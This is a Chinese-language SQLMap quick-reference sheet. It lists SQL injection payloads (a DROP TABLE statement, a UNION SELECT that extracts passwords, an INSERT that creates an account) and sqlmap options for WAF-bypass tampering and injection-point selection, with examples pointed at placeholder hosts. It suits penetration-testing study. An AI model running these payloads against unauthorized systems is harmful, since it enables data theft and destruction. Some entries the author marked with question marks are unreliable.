# SQLMap 参数详解速查(91 个主题)

> 从图形解说 Excel 提取: 每个主题的 命令/功能/示例。完整版含图形见原始 Excel。

## SQL注入符号

| 符号 | 用途 | 示例 |
|------|------|------|
| 单引号 (') | 封装字符串值,结束字符串字面量 | OR '1'='1 |
| 双引号 (") | 封装字符串/MySQL 标识符 | OR 1"="1 |
| -- 注释 | 终止查询忽略剩余 SQL | OR '1'='1' -- |
| # 注释 | MySQL 单行注释 | OR '1'='1' # |
| /* */ 块注释 | 多行注释 | OR '1'='1' /* |
| 括号 () | 分隔/组合子查询 | OR (1=1) |
| 分号 (;) | 分隔多条 SQL 语句 | ; DROP TABLE users; |
| AND/OR | 逻辑组合条件 | AND '1'='1 / OR '1'='1 |
| UNION | 连接结果集(提取多表) | UNION SELECT username,password FROM users |
| INSERT/UPDATE/DELETE | 数据操作注入 | ; INSERT INTO users VALUES ('hacker','password') -- |

## 常用命令速查

| 参数 | 作用 | 示例 |
|------|------|------|
| `--data` | 指定 POST 数据 | `--data="id=1&name=test"` |
| `--method` | 指定 HTTP 方法(GET/POST/PUT) | `--method=POST` |
| `--cookie` | 指定 Cookie | `--cookie="session_id=abc; user_id=1"` |
| `--user-agent` | 指定 UA | `--user-agent="Mozilla/5.0"` |
| `--referer` | 指定 Referer | `--referer="http://example.com"` |
| `--headers` | 多个自定义头 | `--headers="X-Forwarded-For: 127.0.0.1"` |
| `--proxy` | 走代理 | `--proxy="http://127.0.0.1:8080"` |
| `--timeout` | 请求超时(秒) | `--timeout=10` |

## 参数详解(按功能)

### 1. 仅测参数(-p/--param)
- 只测试指定参数,提高效率
- `sqlmap -u "URL?id=1&name=test" -p id,name`
- 适用所有数据库(MySQL/PostgreSQL/MSSQL/Oracle/SQLite)

### 2. 仅测范围(--param-filter)
- 按正则筛选要测试的参数
- `sqlmap -u "URL?id=1&name=test&age=25" --param-filter="id|name"`
- `--param-filter="^cat|price"`(以 cat 开头或含 price)
- 注入点类型: GET/POST/URL/Cookie/User-Agent/Referer/Host/(custom)Post/(custom)Header

### 3. 跳过静态参数(--skip-static)
- 跳过请求中不变的参数,聚焦动态参数
- `sqlmap -u "URL?static=123&dynamic=456" --skip-static`
- 结合: `--skip-static --batch --level=3 --risk=2`

### 4. 忽略参数(--skip)
- 跳过指定参数(如 csrf_token)
- `sqlmap -u "URL?id=1&token=abc" --skip=token`

### 5. 忽略参数正则(--skip-filter?)
- 按正则跳过参数

### 6. payload 前缀(--prefix)
- 指定 payload 前缀(处理闭合)
- `sqlmap -u "URL?id=1" --prefix="')"`

### 7. payload 后缀(--suffix)
- 指定 payload 后缀
- `sqlmap -u "URL?id=1" --suffix="-- -"`

### 8. 固定 DBMS(--dbms)
- 指定数据库类型避免检测
- `--dbms=mysql` / `--dbms=mssql` / `--dbms=oracle` / `--dbms=postgresql` / `--dbms=sqlite`

### 9. DB 认证(--dbms-cred)
- 指定数据库连接凭据 `user:password`

### 10. 固定 OS(--os)
- 指定操作系统 `--os=linux` / `--os=windows`

### 11. 关闭类型转换(--no-cast)
- 关闭数据库类型转换(CAST),避免某些情况

### 12. 关闭 string 转义(--no-escape)
- 关闭字符串转义,避免 payload 被破坏

### 13. 使用大数(--big-numbers)
- 使用大数(如 LIMIT 用大数绕过某些过滤)

### 14. 布尔运算(--smart)
- 仅测启发式判断可能有漏洞的参数

### 15. 随机字串(--random-string?)
- 使用随机字符串测试

### 16. tamper 脚本(--tamper)
- 使用 tamper 绕过 WAF/过滤(69 个见 tamper 速查表)
- `sqlmap -u "URL?id=1" --tamper="space2comment,apostrophemask"`

### 17. 深度与风险(--level/--risk)
- `--level=1-5` 测试深度(默认1,越高越全面)
- `--risk=1-3` 风险等级(1=低,3=高含 OR-based)

### 18. True 字符串(--string)
- 指定判断 True 时的字符串(布尔盲注)

### 19. False 字符串(--not-string)
- 指定判断 False 时的字符串

### 20. 正则(--regexp)
- 用正则匹配响应判断

### 21. HTTP 状态码(--code)
- 指定成功状态码(如 200)
- 如何取得状态码: 看 HTTP 响应头

### 22. 仅对比文本(--text-only)
- 忽略 HTML 标签,只对比文本内容

### 23. 仅对比 title(--title)
- 只对比页面 title

### 24. 寻找明显目标(--smart + 启发式)
- 快速找有明显漏洞的目标参数

## 注入点类型(9 种)

1. GET 参数 — URL 中 `?id=1`
2. POST 参数 — `--data`
3. URL 路径 — 直接注入点
4. Cookie — `--cookie="user_id=1"`(user_id 是注入点)
5. User-Agent — `--user-agent`(可注入)
6. Referer — `--referer`
7. Host — `--headers="Host: x"`
8. (custom) Post — 自定义 POST 数据
9. (custom) Header — 自定义请求头

综合示例:
```bash
sqlmap -u "http://example.com/page.php?id=1" \
  --data="name=test&age=25" \
  --cookie="session_id=abc123; user_id=1" \
  --user-agent="Mozilla/5.0" \
  --referer="http://example.com" \
  --headers="X-Custom-Header: custom_value"
```
